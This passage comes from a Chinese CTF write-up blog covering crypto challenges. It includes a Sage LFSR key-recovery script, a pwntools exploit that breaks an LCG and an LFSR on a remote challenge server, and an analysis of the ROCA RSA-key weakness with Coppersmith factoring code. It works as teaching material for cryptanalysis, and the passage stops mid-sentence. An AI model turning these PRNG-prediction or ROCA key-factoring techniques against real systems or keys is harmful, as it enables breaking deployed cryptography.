class="keyword">assert</span>(MASK.bit_length()==LENGTH)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    l = lfsr(KEY,MASK,LENGTH)</span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">63</span>):</span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            b = (b&lt;&lt;<span class="number">1</span>)+l.next()</span><br><span class="line">        r += pad(bin(b)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r)</span><br></pre></td></tr></table></figure><p>BM算法的前提是要有$2\cdot LENGTH$个连续比特，而密文仅给出$2\cdot LENGTH-8$个连续比特</p><p>因此通过爆破末尾8个比特校验<code>FLAG[7:11]==&#39;1224&#39;</code></p><p>本题类似<a href="https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsr---known-plain-attack" target="_blank" rel="noopener">https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsr—-known-plain-attack</a></p><p>原理可参照<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/#bm-algorithm" target="_blank" rel="noopener">WIKI</a></p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[88]:</span></span><br><span class="line">cipher = open(<span class="string">'output'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[89]:</span></span><br><span class="line">cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[90]:</span></span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">X = []</span><br><span class="line">S = []</span><br><span class="line">LENGTH = <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">    X.append(cipher[i : i + LENGTH])</span><br><span class="line">    S.append(cipher[i + LENGTH])</span><br><span class="line">X = Matrix(F2, X)</span><br><span class="line">S = Matrix(F2, S)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[91]:</span></span><br><span class="line">X, S</span><br><span class="line"><span class="comment"># Out[91]:</span></span><br><span class="line">(<span class="number">248</span> x <span class="number">256</span> dense matrix over Finite Field of size <span class="number">2</span>,</span><br><span class="line"> <span class="number">1</span> x <span class="number">248</span> dense matrix over Finite Field of size <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[92]:</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[93]:</span></span><br><span class="line">suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[94]:</span></span><br><span class="line">MASK = []</span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">    X_n = X</span><br><span class="line">    c = cipher + list(suf)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">8</span>):</span><br><span class="line">        v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">        X_n = X_n.stack(v)</span><br><span class="line">    S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-8</span>:]).T</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msk = X_n.solve_right(S_n)</span><br><span class="line">        MASK.append(msk.T)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[95]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == LENGTH)</span><br><span class="line">    cur = cipher</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">        left = right.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line">        key = str(left) + key</span><br><span class="line">        cur = [left] + cur[:<span class="number">-1</span>]</span><br><span class="line">    key = int(key, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[96]:</span></span><br><span class="line">KEY = []</span><br><span class="line"><span class="keyword">for</span> msk <span class="keyword">in</span> MASK:</span><br><span class="line">    feedback = []</span><br><span class="line">    fb = list(msk[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        <span class="keyword">if</span> fb[i] == <span class="number">1</span>:</span><br><span class="line">            feedback.append(i)</span><br><span class="line">    feedback.append(LENGTH)</span><br><span class="line">    delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line">    KEY.append(decrypt(cipher[:LENGTH], feedback))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[97]:</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[98]:</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> KEY:</span><br><span class="line">    flag = hashlib.sha256(hex(k)[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">4</span>] == <span class="string">"1224"</span>:</span><br><span class="line">        print(<span class="string">"de1ctf&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># de1ctf&#123;1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619&#125;</span></span><br></pre></td></tr></table></figure><h3 id="网鼎杯2020朱雀组-guess-game"><a href="#网鼎杯2020朱雀组-guess-game" class="headerlink" title="网鼎杯2020朱雀组 - guess_game"></a>网鼎杯2020朱雀组 - guess_game</h3><h4 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>LCG - unknown (a, b, m)</li><li>BM algorithm</li></ul><h4 id="题目文件-1"><a href="#题目文件-1" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p>并不是朱雀组der- -赛中V👴分享了下，虽然都是已知考点，但过程还是有点繁琐</p><p>于是自己写dockerfile做了下复现</p><p><a href="dockerfile.zip">Click Here to Download</a></p><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><code>configure</code>选取Game Level时，其对应的level code是由LCG生成的，所有参数均未知，但回显给出连续六个数据，采用之前提到的trick即可，<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcg---unknown-a-b-m" target="_blank" rel="noopener">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcg—-unknown-a-b-m</a></p><p>LCG crack成功以后，拿到的level对应coin为10，因此在LFSR predict时可以用9个coin去换连续9个LFSR输出，即得到连续72bits.</p><p>知n=39，BM algorithm(末尾6bits采用爆破)即可…但仅余1个coin，所以从BM的多组解中随机选择发送，失败即重新remote.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> re, itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LCG</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">        data.append(int(io.recvline().strip()))</span><br><span class="line">    delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">    m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">    m = reduce(GCD, m_mul)</span><br><span class="line">    factors = factor(m)</span><br><span class="line">    <span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">if</span> size(prime) == <span class="number">64</span>:</span><br><span class="line">                m = prime</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            m //= (prime**degree)</span><br><span class="line">    s0, s1, s2 = data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>]</span><br><span class="line">    A = Matrix([</span><br><span class="line">        [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">        [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">        [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">    ])</span><br><span class="line">    A = A.LLL()</span><br><span class="line">    a, b = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">                a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">                a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">        print(<span class="string">"[!] crack_LCG failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    a %= m</span><br><span class="line">    b %= m</span><br><span class="line">    res = (a * data[<span class="number">-1</span>] + b) % m</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the level code:\n"</span>, str(res))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LFSR</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"Input your answer:\n"</span>, <span class="string">"2333"</span>)</span><br><span class="line">        ct = int(re.findall(<span class="string">r"\d+"</span>, io.recvline().decode(<span class="string">"utf-8"</span>))[<span class="number">0</span>])</span><br><span class="line">        cipher += bin(ct)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">"0"</span>)</span><br><span class="line">    cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == <span class="number">72</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LFSR</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    X, S = [], []</span><br><span class="line">    LENGTH = <span class="number">39</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">        X.append(cipher[i : i + LENGTH])</span><br><span class="line">        S.append(cipher[i + LENGTH])</span><br><span class="line">    X, S = Matrix(F2, X), Matrix(F2, S)</span><br><span class="line">    suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">6</span>))</span><br><span class="line">    MASK = []</span><br><span class="line">    <span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">        X_n = X</span><br><span class="line">        c = cipher + list(suf)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">6</span>):</span><br><span class="line">            v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">            X_n = X_n.stack(v)</span><br><span class="line">        S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-6</span>:]).T</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msk = X_n.solve_right(S_n)</span><br><span class="line">            MASK.append(msk.T)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> MASK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_LFSR</span><span class="params">(ct, msk)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    nxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        x = F2(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">            x += ct[j] * msk[j]</span><br><span class="line">        ct = ct[<span class="number">1</span>:] + [int(x)]</span><br><span class="line">        nxt += (int(x) &lt;&lt; (<span class="number">7</span> - i))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your answer:\n"</span>, str(nxt))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Right!"</span> <span class="keyword">in</span> io.recvline().decode(<span class="string">"utf-8"</span>):</span><br><span class="line">        <span class="keyword">return</span> ct</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] predict_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> crack_LCG():</span><br><span class="line">        print(<span class="string">"[+] crack_LCG success."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    cipher = get_LFSR()</span><br><span class="line">    MASK = crack_LFSR(cipher)</span><br><span class="line">    <span class="keyword">if</span> len(MASK):</span><br><span class="line">        print(<span class="string">"[+] &#123;&#125; masks have been found."</span>.format(len(MASK)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] crack_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ct = cipher[<span class="number">-39</span>:]</span><br><span class="line">    msk = list(MASK[randrange(<span class="number">0</span>, len(MASK))][<span class="number">0</span>])</span><br><span class="line">    <span class="comment">#msk = list(MASK[0][0])</span></span><br><span class="line">    ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ct:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">498</span>):</span><br><span class="line">            ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> main() == <span class="literal">False</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        print(cnt)</span><br><span class="line">        io.close()</span><br><span class="line">        io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>重连大概二三十次拿到flag…u1s1网鼎出题人没一个正常的</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-18_17-05-09.png" alt></p><h3 id="GKCTF2020-Backdoor"><a href="#GKCTF2020-Backdoor" class="headerlink" title="GKCTF2020 - Backdoor"></a>GKCTF2020 - Backdoor</h3><h4 id="题目考点-2"><a href="#题目考点-2" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>ROCA (RSALib - CVE)</li><li>PH</li><li>Coppersmith</li></ul><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>这题其实还是有一定难度的- -只是这个CVE披露出来以后github早有完整的轮子（paper题被秒emmm</p><p>在此借鉴paper及github上的脚本进行适当分析：</p><p>RSALib生成大素数的规则如下：</p><script type="math/tex; mode=display">N=(km+(65537^{a})\%M)(lm+(65537^{b})\%M)\equiv 65537^{a+b}(mod\ M).</script><p>且M是前n个素数的乘积（n是有关size(N)的定值）：</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/image-20200525234153390.png" alt></p><p>由于M足够光滑，所以PH求解DLP得到c=a+b，再在$(\frac{c}{2},\frac{c+ord}{2})$上爆破a，进行Coppersmith求解k即可.</p><p>但对于现有的M，$ord_{M}(65537)$过大，而Coppersmith partial p的界还很宽裕，因此我们考虑取得M的因子M’，使得$ord_{M’}(65537)$在满足$size(M’)\geq size(N^{\frac{1}{4}})$的情况下尽可能的小.（此界的估计参考<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p" target="_blank" rel="noopener">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p</a>）</p><p><strong>Get M’ smaller than M (prepared for Coppersmith)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></span><br><span class="line">M = <span class="number">0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_power_factor</span><span class="params">(n)</span>:</span></span><br><span class="line">    div = []</span><br><span class="line">    <span class="keyword">for</span> (p, r) <span class="keyword">in</span> factor(n):</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            div.append(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            div = div + [p**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, r + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> div[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># divided by divisor(p) such that ord_p(65537)\nmid order</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_Gen_M_smaller</span><span class="params">(M, order)</span>:</span></span><br><span class="line">    M_factor = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> M.factor()]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> M_factor:</span><br><span class="line">        p_order = Zmod(p)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">        <span class="keyword">if</span> order % p_order != <span class="number">0</span>:</span><br><span class="line">            M //= p</span><br><span class="line">    <span class="keyword">return</span> M, Zmod(M)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get M' smaller than M</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gen_M_smaller</span><span class="params">(M, bound)</span>:</span></span><br><span class="line">    candidates = [(M, Zmod(M)(<span class="number">65537</span>).multiplicative_order())]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        M_smaller, order = candidates[<span class="number">-1</span>][<span class="number">0</span>], candidates[<span class="number">-1</span>][<span class="number">1</span>]</span><br><span class="line">        order_factor = prime_power_factor(order)</span><br><span class="line">        candidates = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> order_factor:</span><br><span class="line">            new_M, new_order = sub_Gen_M_smaller(M_smaller, order // p)</span><br><span class="line">            param = (log(order, <span class="number">2</span>) - log(new_order, <span class="number">2</span>)) / (log(M_smaller, <span class="number">2</span>) - log(new_M, <span class="number">2</span>)) <span class="comment"># 衡量阶下降速度的参数</span></span><br><span class="line">            candidates.append((new_M, new_order, param))</span><br><span class="line">        candidates = sorted(candidates, key=<span class="keyword">lambda</span> x:x[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> size(candidates[<span class="number">-1</span>][<span class="number">0</span>]) &lt; bound:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> M_smaller, order</span><br><span class="line"></span><br><span class="line"><span class="comment"># size(n)//4 -&gt; Coppersmith bound</span></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, size(n) // <span class="number">4</span>)</span><br><span class="line"><span class="comment"># (1134636716748630821225010071671110, 21840)</span></span><br></pre></td></tr></table></figure><p>获得M’后，我们仍可以将p表示作$k’M’+(65537^{a’})\%M’$，且$k’&lt;N^{\frac{1}{4}}$.</p><p><code>for a in range(c//2, (c + ord) // 2)</code>上Coppersmith求解$f=k*M+pow(65537,a,M)$即可.</p><p>但Coppersmith构造的系数矩阵相关参数mm, tt及解的上界X在默认情况下，于本题效果极差- -</p><p>回到paper发现有对参数构造的方案：</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_00-51-58.png" alt></p><p>这里的$(mm,tt)$在paper中并未给出具体证明，应该是实验性得到的数据- -</p><p>值得注意的是，paper中给出的(5, 6)是针对<code>Gen_M_smaller(M, 512 // 4)</code>给出的，至于能让阶更小的<code>Gen_M_smaller(M, 